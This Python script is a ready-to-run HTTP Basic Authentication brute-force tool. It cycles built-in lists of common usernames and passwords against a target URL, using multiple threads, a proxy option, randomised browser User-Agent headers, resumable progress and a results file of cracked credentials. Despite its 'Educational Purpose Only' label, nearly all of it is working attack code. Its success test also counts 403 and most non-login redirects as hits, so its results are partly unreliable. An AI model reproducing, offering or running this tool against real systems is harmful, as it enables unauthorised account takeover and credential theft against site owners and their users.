#!/usr/bin/env python3
"""
Advanced HTTP Basic Authentication Brute Force Tool
Version: 2.0
Author: Security Research Tool
License: Educational Purpose Only

Features:
- Multi-threaded brute force
- Proxy support
- Built-in wordlists (no external files needed)
- Session management
- Rate limiting
- Resume capability
- Export results
- Real-time progress
- Multiple authentication methods
"""

import requests
import argparse
import sys
import os
import time
import json
import threading
import queue
import base64
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional, Set
import logging
from collections import deque
import signal

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Color:
    """ANSI color codes for terminal output"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class BasicAuthBruteforce:
    """Advanced HTTP Basic Authentication Brute Force Tool"""
    
    def __init__(self, target_url: str, username_list: List[str] = None, password_list: List[str] = None,
                 threads: int = 10, timeout: int = 5, proxy: str = None,
                 user_agent: str = None, verbose: bool = False, output_file: str = None,
                 rate_limit: float = 0.1, max_retries: int = 3, delay_between: float = 0,
                 resume_file: str = None, stop_on_success: bool = True,
                 save_progress: bool = True, use_builtin: bool = False):
        """
        Initialize the brute force tool
        
        Args:
            target_url: Target URL requiring authentication
            username_list: List of usernames to try
            password_list: List of passwords to try
            threads: Number of concurrent threads
            timeout: Request timeout in seconds
            proxy: Proxy URL
            user_agent: Custom User-Agent
            verbose: Enable verbose output
            output_file: File to save results
            rate_limit: Delay between requests (seconds)
            max_retries: Maximum retries on failure
            delay_between: Delay between authentication attempts
            resume_file: File to save/load progress
            stop_on_success: Stop when credentials found
            save_progress: Save progress to file
            use_builtin: Use built-in wordlists
        """
        self.target_url = self._normalize_url(target_url)
        
        # Use built-in wordlists if not provided
        if use_builtin or not username_list:
            username_list = self.generate_username_list()
        if use_builtin or not password_list:
            password_list = self.generate_password_list()
            
        self.username_list = username_list
        self.password_list = password_list
        self.threads = min(threads, 50)  # Cap threads at 50
        self.timeout = timeout
        self.proxy = proxy
        self.user_agent = user_agent or self._get_random_user_agent()
        self.verbose = verbose
        self.output_file = output_file
        self.rate_limit = rate_limit
        self.max_retries = max_retries
        self.delay_between = delay_between
        self.resume_file = resume_file
        self.stop_on_success = stop_on_success
        self.save_progress = save_progress
        self.use_builtin = use_builtin
        
        # Results tracking
        self.found_credentials = []
        self.attempted = set()
        self.total_combinations = len(username_list) * len(password_list)
        self.attempted_count = 0
        self.lock = threading.Lock()
        self.stop_flag = threading.Event()
        
        # Progress tracking
        self.start_time = None
        self.last_save_time = time.time()
        self.progress_interval = 30  # Save progress every 30 seconds
        
        # Setup session
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
            
        # Setup logging
        self._setup_logging()
        
        # Load resume data if exists
        self._load_resume_data()
        
        # Print banner
        self._print_banner()
        
    def generate_username_list(self) -> List[str]:
        """Generate a comprehensive default username list"""
        usernames = [
            # Common admin accounts
            'admin', 'root', 'administrator', 'sysadmin', 'webadmin', 'itadmin',
            'superuser', 'supervisor', 'manager', 'operator', 'ceo', 'cto',
            
            # System accounts
            'user', 'test', 'guest', 'demo', 'default', 'anonymous',
            'nobody', 'support', 'info', 'helpdesk', 'service',
            
            # Technical roles
            'developer', 'devops', 'engineer', 'analyst', 'architect',
            'dba', 'database', 'network', 'security', 'sysops',
            
            # Common names
            'john', 'jane', 'mike', 'sarah', 'david', 'emma', 'james', 'lisa',
            'robert', 'maria', 'william', 'patricia', 'joseph', 'jennifer',
            
            # Department accounts
            'hr', 'finance', 'sales', 'marketing', 'legal', 'compliance',
            'audit', 'procurement', 'operations', 'logistics',
            
            # Application-specific
            'tomcat', 'mysql', 'postgres', 'mongodb', 'redis', 'elastic',
            'rabbitmq', 'kafka', 'zookeeper', 'hadoop', 'spark',
            
            # Cloud/DevOps
            'azure', 'aws', 'gcp', 'docker', 'kubernetes', 'jenkins',
            'ansible', 'terraform', 'puppet', 'chef',
            
            # CMS/Platform
            'wp-admin', 'joomla', 'drupal', 'magento', 'shopify',
            'wordpress', 'jira', 'confluence', 'bitbucket', 'gitlab',
            
            # Security-related
            'pentest', 'security', 'firewall', 'vpn', 'proxy',
            'waf', 'ids', 'ips', 'soc', 'cso'
        ]
        return list(dict.fromkeys(usernames))  # Remove duplicates while preserving order
        
    def generate_password_list(self) -> List[str]:
        """Generate a comprehensive default password list"""
        passwords = [
            # Most common passwords
            'password', 'password123', 'password1', 'Password123',
            '123456', '12345678', '123456789', '12345', '1234',
            'qwerty', 'qwerty123', 'qwertyuiop', 'abc123',
            
            # Admin/default passwords
            'admin', 'admin123', 'admin@123', 'Admin123', 'administrator',
            'root', 'root123', 'toor', 'password', 'P@ssw0rd',
            
            # Common variations
            'welcome', 'welcome1', 'Welcome123', 'letmein', 'letmein123',
            'passw0rd', 'p@ssw0rd', 'P@ssword', 'P@ssw0rd123',
            
            # Year-based
            '2023', '2024', '2025', '2026', '2023@', '2024@',
            'admin2023', 'admin2024', 'password2023', 'password2024',
            
            # Simple variations
            'test', 'test123', 'testing', 'demo', 'demo123', 'default',
            'changeme', 'ChangeMe', 'Changeme123',
            
            # Keyboard patterns
            'qwerty', 'qwerty123', 'qwertyuiop', 'asdfgh', 'zxcvbn',
            '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'wsxedc',
            
            # Common phrases
            'iloveyou', 'iloveyou1', 'love', 'love123', 'sunshine',
            'princess', 'dragon', 'monkey', 'shadow', 'master',
            
            # Corporate/Enterprise
            'Welcome1', 'Welcome123', 'changeme', 'ChangeMe123',
            'Company123', 'pass@123', 'user@123', 'admin@123',
            
            # System/Technical
            'mysql', 'postgres', 'mongodb', 'redis', 'elastic',
            'tomcat', 'jenkins', 'docker', 'kubernetes',
            
            # Common with special chars
            'Password1!', 'P@ssw0rd!', 'Admin@123', 'Root@123',
            'Welcome@123', 'Pass@123', 'Test@123', 'Demo@123',
            
            # Seasonal
            'Summer2023', 'Winter2023', 'Spring2024', 'Fall2024',
            'Christmas2023', 'Happy2024', 'NewYear2024',
            
            # Sports/Teams
            'football', 'baseball', 'soccer', 'hockey', 'basketball',
            'lakers', 'cowboys', 'patriots', 'yankees', 'chelsea',
            
            # Pop culture
            'starwars', 'batman', 'superman', 'spiderman', 'thor',
            'marvel', 'dc', 'harrypotter', 'hobbit', 'lotr'
        ]
        return list(dict.fromkeys(passwords))  # Remove duplicates while preserving order
        
    def _setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO if self.verbose else logging.WARNING,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
    def _normalize_url(self, url: str) -> str:
        """Normalize URL format"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
        
    def _get_random_user_agent(self) -> str:
        """Generate a random User-Agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(user_agents)
        
    def _print_banner(self):
        """Print tool banner"""
        banner = f"""
{Color.CYAN}{Color.BOLD}
╔══════════════════════════════════════════════════════════════╗
║     Advanced HTTP Basic Authentication Brute Force Tool     ║
║                    Version 2.0                              ║
╚══════════════════════════════════════════════════════════════╝
{Color.RESET}
{Color.YELLOW}[*] Target: {self.target_url}
[*] Usernames: {len(self.username_list):,}
[*] Passwords: {len(self.password_list):,}
[*] Total Combinations: {self.total_combinations:,}
[*] Threads: {self.threads}
[*] Timeout: {self.timeout}s
[*] Rate Limit: {self.rate_limit}s
[*] Wordlist: {'Built-in' if self.use_builtin else 'Custom'}
{Color.RESET}
        """
        print(banner)
        
    def _load_resume_data(self):
        """Load previously saved progress"""
        if not self.resume_file:
            self.resume_file = f"{self.target_url.replace('://', '_').replace('/', '_')}_progress.json"
            
        if os.path.exists(self.resume_file) and self.save_progress:
            try:
                with open(self.resume_file, 'r') as f:
                    data = json.load(f)
                    self.attempted = set(data.get('attempted', []))
                    self.found_credentials = data.get('found', [])
                    print(f"{Color.GREEN}[+] Resuming from saved progress...{Color.RESET}")
                    print(f"[*] Already attempted: {len(self.attempted):,} combinations")
            except Exception as e:
                self.logger.debug(f"Error loading resume data: {str(e)}")
                
    def _save_progress(self):
        """Save current progress to file"""
        if not self.save_progress:
            return
            
        try:
            data = {
                'attempted': list(self.attempted),
                'found': self.found_credentials,
                'timestamp': datetime.now().isoformat(),
                'total_combinations': self.total_combinations
            }
            with open(self.resume_file, 'w') as f:
                json.dump(data, f, indent=2)
            self.last_save_time = time.time()
        except Exception as e:
            self.logger.debug(f"Error saving progress: {str(e)}")
            
    def _test_credentials(self, username: str, password: str) -> Tuple[bool, int, str]:
        """
        Test a username/password combination
        
        Returns:
            Tuple[success, status_code, response_text]
        """
        key = f"{username}:{password}"
        
        # Check if already attempted
        if key in self.attempted:
            return False, 0, "Already attempted"
            
        # Apply rate limiting
        time.sleep(self.rate_limit)
        
        # Encode credentials
        credentials = f"{username}:{password}"
        encoded = base64.b64encode(credentials.encode()).decode()
        
        # Create auth header
        headers = self.session.headers.copy()
        headers['Authorization'] = f'Basic {encoded}'
        
        # Retry logic
        for attempt in range(self.max_retries):
            try:
                response = self.session.get(
                    self.target_url,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False
                )
                
                # Check if authentication was successful
                # Basic auth success: Status 200 OK (not 401)
                # Some sites redirect on success (302)
                success = False
                if response.status_code == 200:
                    success = True
                elif response.status_code == 302:
                    # Check if redirect goes to a protected page
                    if 'login' not in response.headers.get('Location', '').lower():
                        success = True
                elif response.status_code == 403:
                    # Sometimes 403 means authenticated but forbidden
                    # Could still be valid credentials
                    success = True
                    
                # Additional checks for success
                if success or response.status_code not in [401, 403]:
                    # Check for authentication indicators
                    content_lower = response.text.lower()
                    if 'authentication failed' in content_lower or 'invalid credentials' in content_lower:
                        success = False
                    elif 'welcome' in content_lower or 'dashboard' in content_lower:
                        success = True
                        
                # Add to attempted set
                with self.lock:
                    self.attempted.add(key)
                    self.attempted_count += 1
                    
                return success, response.status_code, response.text[:500] if success else ""
                
            except requests.exceptions.Timeout:
                self.logger.debug(f"Timeout for {username}:{password}")
                continue
            except requests.exceptions.ConnectionError:
                self.logger.debug(f"Connection error for {username}:{password}")
                continue
            except Exception as e:
                self.logger.debug(f"Error for {username}:{password}: {str(e)}")
                continue
                
        return False, 0, "Max retries exceeded"
        
    def _display_progress(self):
        """Display current progress"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            rate = self.attempted_count / elapsed if elapsed > 0 else 0
            remaining = (self.total_combinations - self.attempted_count) / rate if rate > 0 else 0
            
            progress = f"""
{Color.CYAN}Progress Update:{Color.RESET}
  Attempted: {self.attempted_count:,} / {self.total_combinations:,}
  Progress: {(self.attempted_count/self.total_combinations*100):.1f}%
  Speed: {rate:.1f} attempts/sec
  ETA: {self._format_time(remaining)}
  Found: {len(self.found_credentials)} credentials
  Elapsed: {self._format_time(elapsed)}
            """
            print(progress)
            
    def _format_time(self, seconds: float) -> str:
        """Format time in human-readable format"""
        if seconds < 0:
            return "Unknown"
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        seconds = int(seconds % 60)
        
        if hours > 0:
            return f"{hours}h {minutes}m {seconds}s"
        elif minutes > 0:
            return f"{minutes}m {seconds}s"
        else:
            return f"{seconds}s"
            
    def _worker(self, username_queue: queue.Queue):
        """Worker thread for processing username/password combinations"""
        while not self.stop_flag.is_set():
            try:
                username = username_queue.get(timeout=1)
            except queue.Empty:
                break
                
            # Iterate through passwords
            for password in self.password_list:
                if self.stop_flag.is_set():
                    break
                    
                # Check if this combination was already attempted
                key = f"{username}:{password}"
                if key in self.attempted:
                    continue
                    
                # Test credentials
                success, status_code, response_text = self._test_credentials(username, password)
                
                if success:
                    with self.lock:
                        self.found_credentials.append({
                            'username': username,
                            'password': password,
                            'status_code': status_code,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        # Print success
                        print(f"\n{Color.GREEN}{Color.BOLD}[+] SUCCESS!{Color.RESET}")
                        print(f"{Color.GREEN}    Username: {username}")
                        print(f"    Password: {password}")
                        print(f"    Status: {status_code}{Color.RESET}")
                        
                        if self.output_file:
                            self._save_results()
                            
                        if self.stop_on_success:
                            self.stop_flag.set()
                            break
                            
                # Log failed attempt if verbose
                if self.verbose and status_code == 401:
                    print(f"{Color.YELLOW}[-] Failed: {username}:{password} (401 Unauthorized){Color.RESET}")
                elif self.verbose and status_code == 403:
                    print(f"{Color.YELLOW}[-] Failed: {username}:{password} (403 Forbidden){Color.RESET}")
                    
                # Optional delay between attempts
                if self.delay_between > 0:
                    time.sleep(self.delay_between)
                    
                # Save progress periodically
                if self.save_progress and (time.time() - self.last_save_time) > self.progress_interval:
                    self._save_progress()
                    
            username_queue.task_done()
            
    def run(self) -> List[Dict]:
        """
        Start the brute force attack
        
        Returns:
            List of found credentials
        """
        self.start_time = time.time()
        
        print(f"{Color.GREEN}[*] Starting brute force attack...{Color.RESET}")
        print(f"{Color.YELLOW}[!] Press Ctrl+C to stop gracefully{Color.RESET}")
        
        # Setup signal handler
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # Create username queue
        username_queue = queue.Queue()
        for username in self.username_list:
            username_queue.put(username)
            
        # Start worker threads
        threads = []
        for _ in range(min(self.threads, username_queue.qsize())):
            t = threading.Thread(target=self._worker, args=(username_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
            
        # Monitor progress
        last_display = time.time()
        try:
            while not self.stop_flag.is_set() and not username_queue.empty():
                time.sleep(1)
                
                # Display progress every 10 seconds
                if time.time() - last_display > 10:
                    self._display_progress()
                    last_display = time.time()
                    
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}[!] Interrupted by user. Saving progress...{Color.RESET}")
            self.stop_flag.set()
            
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=2)
            
        # Save final progress
        if self.save_progress:
            self._save_results()
            self._save_progress()
            
        # Display final results
        self._display_final_results()
        
        return self.found_credentials
        
    def _signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Color.YELLOW}[!] Received interrupt signal. Shutting down...{Color.RESET}")
        self.stop_flag.set()
        
    def _display_final_results(self):
        """Display final results summary"""
        elapsed = time.time() - self.start_time
        
        print(f"\n{Color.CYAN}{'='*60}")
        print(f"{Color.BOLD}FINAL RESULTS SUMMARY{Color.RESET}")
        print(f"{Color.CYAN}{'='*60}{Color.RESET}")
        
        print(f"{Color.WHITE}Target: {self.target_url}")
        print(f"Total Attempted: {self.attempted_count:,} / {self.total_combinations:,}")
        print(f"Success Rate: {(len(self.found_credentials)/self.attempted_count*100):.2f}%" if self.attempted_count > 0 else "N/A")
        print(f"Time Elapsed: {self._format_time(elapsed)}")
        print(f"Average Speed: {self.attempted_count/elapsed:.1f} attempts/sec" if elapsed > 0 else "N/A")
        print(f"Credentials Found: {len(self.found_credentials)}{Color.RESET}")
        
        if self.found_credentials:
            print(f"\n{Color.GREEN}{Color.BOLD}[+] Valid Credentials Found:{Color.RESET}")
            for cred in self.found_credentials:
                print(f"{Color.GREEN}  Username: {cred['username']}")
                print(f"  Password: {cred['password']}")
                print(f"  Status: {cred['status_code']}")
                print(f"  Found at: {cred['timestamp']}")
                print(f"{Color.CYAN}  {'-'*40}{Color.RESET}")
        else:
            print(f"\n{Color.RED}[-] No valid credentials found.{Color.RESET}")
            
        if self.output_file:
            print(f"\n{Color.GREEN}[+] Results saved to: {self.output_file}{Color.RESET}")
            
        print(f"{Color.CYAN}{'='*60}{Color.RESET}")
        
    def _save_results(self):
        """Save results to file"""
        if not self.output_file and not self.found_credentials:
            return
            
        output_file = self.output_file or f"{self.target_url.replace('://', '_').replace('/', '_')}_results.json"
        
        try:
            data = {
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'total_attempted': self.attempted_count,
                'total_combinations': self.total_combinations,
                'found_credentials': self.found_credentials,
                'scan_parameters': {
                    'threads': self.threads,
                    'timeout': self.timeout,
                    'rate_limit': self.rate_limit,
                    'max_retries': self.max_retries
                }
            }
            
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=2)
                
            self.output_file = output_file
            
        except Exception as e:
            self.logger.error(f"Error saving results: {str(e)}")

def load_wordlist(filename: str) -> List[str]:
    """Load wordlist from file"""
    try:
        if not os.path.exists(filename):
            print(f"{Color.RED}[-] Error: Wordlist file not found: {filename}{Color.RESET}")
            return []
            
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
            
        print(f"{Color.GREEN}[+] Loaded {len(words)} words from {filename}{Color.RESET}")
        return words
    except Exception as e:
        print(f"{Color.RED}[-] Error loading wordlist {filename}: {str(e)}{Color.RESET}")
        return []

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Advanced HTTP Basic Authentication Brute Force Tool - With Built-in Wordlists',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Use built-in wordlists (no external files needed!)
  python bruteforce-baseAuth.py https://example.com --builtin
  
  # Use custom wordlists (if you have them)
  python bruteforce-baseAuth.py https://example.com -U users.txt -P pass.txt
  
  # Use built-in with verbose output
  python bruteforce-baseAuth.py https://example.com --builtin -v
  
  # Advanced usage with threading and proxy
  python bruteforce-baseAuth.py https://example.com --builtin -t 20 -p http://127.0.0.1:8080
  
  # Save results
  python bruteforce-baseAuth.py https://example.com --builtin -v -o results.json
  
  # Quick test with local server
  python bruteforce-baseAuth.py http://localhost:8080 --builtin -t 30 -r 0.01
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., https://example.com/admin)')
    parser.add_argument('--builtin', action='store_true', help='Use built-in wordlists (recommended)')
    parser.add_argument('-U', '--username-list', help='File containing usernames (one per line)')
    parser.add_argument('-P', '--password-list', help='File containing passwords (one per line)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    parser.add_argument('-r', '--rate-limit', type=float, default=0.1, help='Rate limit in seconds (default: 0.1)')
    parser.add_argument('--max-retries', type=int, default=3, help='Maximum retries on failure (default: 3)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between attempts in seconds')
    parser.add_argument('--resume', action='store_true', help='Resume from previous scan')
    parser.add_argument('--no-stop', action='store_true', help='Don\'t stop on success')
    parser.add_argument('--no-save', action='store_true', help='Don\'t save progress')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.target:
        print(f"{Color.RED}[-] Error: Target URL is required{Color.RESET}")
        sys.exit(1)
        
    # Load wordlists
    username_list = []
    password_list = []
    
    if args.builtin:
        print(f"{Color.GREEN}[+] Using built-in wordlists{Color.RESET}")
        # Create temporary tool instance to generate wordlists
        temp_tool = BasicAuthBruteforce("http://temp.com", use_builtin=True)
        username_list = temp_tool.generate_username_list()
        password_list = temp_tool.generate_password_list()
        print(f"{Color.GREEN}[+] Generated {len(username_list)} usernames and {len(password_list)} passwords{Color.RESET}")
    else:
        if args.username_list:
            username_list = load_wordlist(args.username_list)
        else:
            print(f"{Color.YELLOW}[!] No username list provided, using built-in...{Color.RESET}")
            temp_tool = BasicAuthBruteforce("http://temp.com", use_builtin=True)
            username_list = temp_tool.generate_username_list()
            
        if args.password_list:
            password_list = load_wordlist(args.password_list)
        else:
            print(f"{Color.YELLOW}[!] No password list provided, using built-in...{Color.RESET}")
            temp_tool = BasicAuthBruteforce("http://temp.com", use_builtin=True)
            password_list = temp_tool.generate_password_list()
            
    # Check if wordlists are loaded
    if not username_list:
        print(f"{Color.RED}[-] No usernames loaded. Exiting.{Color.RESET}")
        sys.exit(1)
        
    if not password_list:
        print(f"{Color.RED}[-] No passwords loaded. Exiting.{Color.RESET}")
        sys.exit(1)
        
    # Create and run the brute force tool
    try:
        tool = BasicAuthBruteforce(
            target_url=args.target,
            username_list=username_list,
            password_list=password_list,
            threads=args.threads,
            timeout=args.timeout,
            proxy=args.proxy,
            user_agent=args.user_agent,
            verbose=args.verbose,
            output_file=args.output,
            rate_limit=args.rate_limit,
            max_retries=args.max_retries,
            delay_between=args.delay,
            resume_file=None if not args.resume else None,
            stop_on_success=not args.no_stop,
            save_progress=not args.no_save,
            use_builtin=args.builtin
        )
        
        results = tool.run()
        
        # Return appropriate exit code
        if results:
            sys.exit(0)
        else:
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}[!] Scan interrupted by user{Color.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Color.RED}[-] Error: {str(e)}{Color.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Add random module for user agent selection
    import random
    main()